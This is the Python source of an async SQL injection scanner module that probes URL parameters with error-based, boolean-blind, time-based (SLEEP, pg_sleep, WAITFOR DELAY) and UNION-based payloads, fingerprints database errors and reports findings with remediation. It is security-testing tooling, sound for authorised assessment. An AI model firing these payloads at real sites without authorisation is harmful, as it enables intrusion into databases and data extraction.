"""
scanners/sqli_scanner.py — SQL Injection scanner (v2 async rewrite).

Detection techniques:
  1. Error-based   — inject quote chars, match DBMS error signatures (requires 2/3 payloads)
  2. Time-based    — 3 sequential payloads (2s, 4s, 6s), monotonic increase required
  3. Boolean-blind — TRUE/FALSE conditional pairs, response diff > 15%
  4. UNION-based   — column enumeration via ORDER BY, verify version extraction

Uses ScanContext.discovered_urls — no internal crawling.
"""
from __future__ import annotations

import asyncio
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Set, Tuple

import httpx
from loguru import logger

from core.context import ScanContext
from core.findings import Finding
from scanners.base_scanner import BaseScanner

# ---------------------------------------------------------------------------
# DBMS Error Signatures
# ---------------------------------------------------------------------------
SQL_ERRORS: Dict[str, List[str]] = {
    "MySQL": [
        "you have an error in your sql syntax",
        "check the manual that corresponds to your mysql server version",
        "mysql_fetch_", "mysqli_", "valid mysql result",
        "expression #1 of select list", "warning: mysqli",
        "mysqlclient", "com.mysql.jdbc",
    ],
    "PostgreSQL": [
        "pg::error", "warning: pg_", "invalid input syntax for integer",
        "pg::syntaxerror", "query failed: error: syntax error at or near",
        "postgresql query failed", "unterminated quoted string at or near",
    ],
    "MSSQL": [
        "unclosed quotation mark after the character string",
        "microsoft ole db provider for sql server",
        "ole db provider for sql server", "sqlserver jdbc driver",
        "warning: mssql", "sql server error", "incorrect syntax near",
        "[microsoft][odbc sql server driver]",
    ],
    "Oracle": [
        "ora-00933", "ora-01756", "ora-00907", "ora-01722",
        "oracle error", "oracle oci", "warning: oci_",
        "pl/sql:", "quoted string not properly terminated",
    ],
    "SQLite": [
        "sqlite/jdbcdriver", "sqlite.exception", "system.data.sqlite.sqliteexception",
        "warning: sqlite", "sqlite3_", "unrecognized token",
    ],
}

# Error-based injection characters
ERROR_PAYLOADS = ["'", '"', "\\'", "';--", '";--', "1' AND 1=CONVERT(int,(SELECT 1))--"]

# Time-based payloads: (template with {delay}, db_name)
TIME_PAYLOADS = [
    ("1' AND SLEEP({delay})--", "MySQL"),
    ("1' AND pg_sleep({delay})--", "PostgreSQL"),
    ("1'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
    ("1' AND 1=1 AND SLEEP({delay})--", "MySQL-alt"),
]

# Boolean-based payload pairs: (true_payload, false_payload)
BOOLEAN_PAYLOADS = [
    ("1' OR '1'='1", "1' AND '1'='2"),
    ("1 OR 1=1", "1 AND 1=2"),
    ("1'/**/OR/**/1=1--", "1'/**/AND/**/1=2--"),
]

UNION_MAX_COLS = 10


def _fingerprint_error(body: str) -> Optional[str]:
    """Match response body against DBMS error signatures. Returns DB name or None."""
    body_lower = body.lower()
    for db, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if pattern in body_lower:
                return db
    return None


class SQLiScanner(BaseScanner):
    """
    Async SQL Injection scanner with 4 detection techniques.
    Uses ScanContext.discovered_urls — no internal crawling.
    """

    async def scan(self) -> List[Finding]:
        findings: List[Finding] = []
        confirmed_params: Set[Tuple[str, str]] = set()  # (endpoint, param)

        # Collect parameterized URLs from shared context
        urls_to_test = [u for u in self.ctx.discovered_urls if "?" in u]
        if not urls_to_test and "?" in self.ctx.target:
            urls_to_test = [self.ctx.target]

        if not urls_to_test:
            self.log.info("No parameterized URLs found for SQLi testing")
            return [self.finding(
                title="No URL Parameters Found for SQLi Testing",
                severity="INFO",
                description="No query string parameters were discovered. SQL injection testing requires injectable URL parameters.",
                evidence={"target": self.ctx.target, "crawled_urls": len(self.ctx.discovered_urls)},
                remediation="Crawl the target further or supply URLs with query parameters (e.g. ?id=1).",
            )]

        # Establish baseline response time for timing attack calibration
        baseline_time = await self._get_baseline_time()
        self.log.info(f"SQLi: {len(urls_to_test)} URLs to test, baseline={baseline_time:.2f}s")

        # Test URLs concurrently with limited concurrency
        semaphore = asyncio.Semaphore(3)
        tasks = [
            self._test_url(url, baseline_time, confirmed_params, semaphore)
            for url in urls_to_test
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, list):
                findings.extend(res)
            elif isinstance(res, Exception):
                self.log.error(f"SQLi URL test error: {res}")

        self.log.info(f"SQLi scan complete: {len(findings)} findings")
        return findings

    async def _get_baseline_time(self) -> float:
        """Measure baseline response time (average of 2 requests)."""
        times = []
        for _ in range(2):
            start = time.monotonic()
            resp = await self.get(self.ctx.target)
            elapsed = time.monotonic() - start
            if resp is not None:
                times.append(elapsed)
        return sum(times) / len(times) if times else 1.0

    async def _test_url(
        self,
        url: str,
        baseline_time: float,
        confirmed_params: Set[Tuple[str, str]],
        semaphore: asyncio.Semaphore,
    ) -> List[Finding]:
        """Test all parameters in a URL for SQLi using all techniques."""
        async with semaphore:
            findings: List[Finding] = []
            try:
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
            except Exception:
                return []

            for param_name in params:
                endpoint = urllib.parse.urlunparse(
                    (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
                )
                key = (endpoint, param_name)
                if key in confirmed_params:
                    continue

                # Technique 1: Error-based (fastest, most reliable)
                result = await self._test_error_based(url, parsed, params, param_name)
                if result:
                    confirmed_params.add(key)
                    findings.append(result)
                    continue

                # Technique 2: Boolean-blind
                result = await self._test_boolean_blind(url, parsed, params, param_name)
                if result:
                    confirmed_params.add(key)
                    findings.append(result)
                    continue

                # Technique 3: Time-based (slowest — only if others miss)
                result = await self._test_time_blind(url, parsed, params, param_name, baseline_time)
                if result:
                    confirmed_params.add(key)
                    findings.append(result)
                    continue

                # Technique 4: UNION-based
                result = await self._test_union_based(url, parsed, params, param_name)
                if result:
                    confirmed_params.add(key)
                    findings.append(result)

            return findings

    async def _inject_param(
        self,
        parsed: urllib.parse.ParseResult,
        params: dict,
        param_name: str,
        payload: str,
        extra_timeout: float = 8.0,
    ) -> Optional[httpx.Response]:
        """Inject payload into a URL parameter and return the response."""
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        test_params[param_name] = payload
        query = urllib.parse.urlencode(test_params)
        test_url = parsed._replace(query=query).geturl()
        return await self.get(test_url, timeout=self.ctx.timeout + extra_timeout)

    async def _test_error_based(
        self, url: str, parsed, params: dict, param_name: str
    ) -> Optional[Finding]:
        """Error-based: require 2/3 payloads triggering the same DBMS signature."""
        dbms_hits: Dict[str, int] = {}
        last_payload = ""
        for payload in ERROR_PAYLOADS[:4]:
            resp = await self._inject_param(parsed, params, param_name, payload)
            if resp is None:
                continue
            db = _fingerprint_error(resp.text)
            if db:
                dbms_hits[db] = dbms_hits.get(db, 0) + 1
                last_payload = payload
                if dbms_hits[db] >= 2:
                    return self.finding(
                        title=f"Error-Based SQL Injection ({db})",
                        severity="CRITICAL",
                        description=(
                            f"Parameter '{param_name}' is vulnerable to error-based SQL injection. "
                            f"Two separate payloads triggered {db} error signatures in the response."
                        ),
                        evidence={
                            "url": url,
                            "parameter": param_name,
                            "payload": last_payload,
                            "database": db,
                            "trigger_count": dbms_hits[db],
                        },
                        remediation="Use parameterized queries (prepared statements). Never concatenate user input into SQL.",
                        target=url,
                        verified=True,
                        tags=["sqli", "error-based", db.lower()],
                    )
        return None

    async def _test_time_blind(
        self, url: str, parsed, params: dict, param_name: str, baseline: float
    ) -> Optional[Finding]:
        """Time-based: send payloads with 2s/4s/6s delays, require monotonic increase."""
        if baseline > 3.0:
            self.log.debug(f"Skipping time-blind for {param_name}: baseline {baseline:.2f}s too high")
            return None

        delays = [2, 4, 6]
        for db_payload_template, db_name in TIME_PAYLOADS:
            observed: List[float] = []
            ok = True
            for delay in delays:
                payload = db_payload_template.format(delay=delay)
                start = time.monotonic()
                resp = await self._inject_param(parsed, params, param_name, payload, extra_timeout=delay + 4)
                elapsed = time.monotonic() - start
                if resp is None:
                    ok = False
                    break
                observed.append(elapsed)

            if not ok or len(observed) < 3:
                continue

            # Check monotonically increasing (with 0.5s tolerance)
            monotonic = all(
                observed[i] <= observed[i + 1] + 0.5 for i in range(len(observed) - 1)
            )
            # Check first delay significantly exceeds baseline
            confirmed = observed[0] >= baseline + delays[0] * 0.75

            if monotonic and confirmed:
                return self.finding(
                    title=f"Time-Based Blind SQL Injection ({db_name})",
                    severity="CRITICAL",
                    description=(
                        f"Parameter '{param_name}' is vulnerable to time-based blind SQL injection ({db_name}). "
                        f"Response times increased monotonically with {delays}s delay payloads."
                    ),
                    evidence={
                        "url": url,
                        "parameter": param_name,
                        "database": db_name,
                        "baseline_time": f"{baseline:.2f}s",
                        "observed_times": [f"{t:.2f}s" for t in observed],
                        "target_delays": delays,
                    },
                    remediation="Use parameterized queries immediately. Time-based SQLi can exfiltrate full database contents.",
                    target=url,
                    verified=True,
                    tags=["sqli", "time-based", "blind", db_name.lower()],
                )
        return None

    async def _test_boolean_blind(
        self, url: str, parsed, params: dict, param_name: str
    ) -> Optional[Finding]:
        """Boolean-blind: TRUE/FALSE pairs, report if response content differs >15%."""
        baseline_resp = await self.get(url, timeout=self.ctx.timeout)
        if baseline_resp is None:
            return None
        baseline_len = len(baseline_resp.content)

        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            true_resp = await self._inject_param(parsed, params, param_name, true_payload)
            false_resp = await self._inject_param(parsed, params, param_name, false_payload)
            if true_resp is None or false_resp is None:
                continue

            true_len = len(true_resp.content)
            false_len = len(false_resp.content)
            max_len = max(true_len, false_len, 1)
            diff_pct = abs(true_len - false_len) / max_len * 100

            # TRUE response should be closer to baseline than FALSE
            true_delta = abs(true_len - baseline_len)
            false_delta = abs(false_len - baseline_len)

            if diff_pct > 15 and false_delta > true_delta:
                return self.finding(
                    title="Boolean-Based Blind SQL Injection",
                    severity="HIGH",
                    description=(
                        f"Parameter '{param_name}' appears vulnerable to boolean-based blind SQL injection. "
                        f"TRUE and FALSE conditional payloads produce responses differing by {diff_pct:.1f}% in content length."
                    ),
                    evidence={
                        "url": url,
                        "parameter": param_name,
                        "true_payload": true_payload,
                        "false_payload": false_payload,
                        "baseline_length": baseline_len,
                        "true_response_length": true_len,
                        "false_response_length": false_len,
                        "content_diff_percent": f"{diff_pct:.1f}%",
                    },
                    remediation="Use parameterized queries. Boolean blind SQLi can extract full database contents character by character.",
                    target=url,
                    verified=False,
                    false_positive_risk="MEDIUM",
                    tags=["sqli", "boolean-blind"],
                )
        return None

    async def _test_union_based(
        self, url: str, parsed, params: dict, param_name: str
    ) -> Optional[Finding]:
        """UNION-based: enumerate columns via ORDER BY, verify version extraction."""
        col_count = await self._find_column_count(parsed, params, param_name)
        if col_count is None:
            return None

        null_cols = ",".join(["NULL"] * col_count)
        version_tests = [
            (f"' UNION SELECT {null_cols.replace('NULL', '@@version', 1)}--", "MySQL/MSSQL"),
            (f"' UNION SELECT {null_cols.replace('NULL', 'version()', 1)}--", "PostgreSQL"),
        ]

        for payload, db_hint in version_tests:
            resp = await self._inject_param(parsed, params, param_name, payload)
            if resp is None:
                continue
            # Look for version strings like 5.7.x, 8.0.x, 2019, etc.
            version_matches = re.findall(
                r"(?:(?:\d+\.){2,}\d+|Microsoft SQL Server \d{4})", resp.text
            )
            if version_matches:
                return self.finding(
                    title="UNION-Based SQL Injection (Version Extracted)",
                    severity="CRITICAL",
                    description=(
                        f"Parameter '{param_name}' is vulnerable to UNION-based SQL injection. "
                        f"Database version was successfully extracted from the response, "
                        f"confirming full injection and potential for complete data exfiltration."
                    ),
                    evidence={
                        "url": url,
                        "parameter": param_name,
                        "column_count": col_count,
                        "db_hint": db_hint,
                        "extracted_version": version_matches[0],
                        "union_payload": payload[:120],
                    },
                    remediation="CRITICAL: Switch to parameterized queries immediately. UNION injection allows reading all database tables.",
                    target=url,
                    verified=True,
                    cvss_score=9.8,
                    tags=["sqli", "union-based", "data-extraction"],
                )
        return None

    async def _find_column_count(self, parsed, params: dict, param_name: str) -> Optional[int]:
        """Find UNION column count via ORDER BY probing."""
        for col_num in range(1, UNION_MAX_COLS + 1):
            payload = f"1 ORDER BY {col_num}--"
            resp = await self._inject_param(parsed, params, param_name, payload)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            # ORDER BY too-high index triggers an error
            if any(err in body_lower for err in ["unknown column", "order by", "1 order", "column"]):
                return col_num - 1 if col_num > 1 else None
        return None
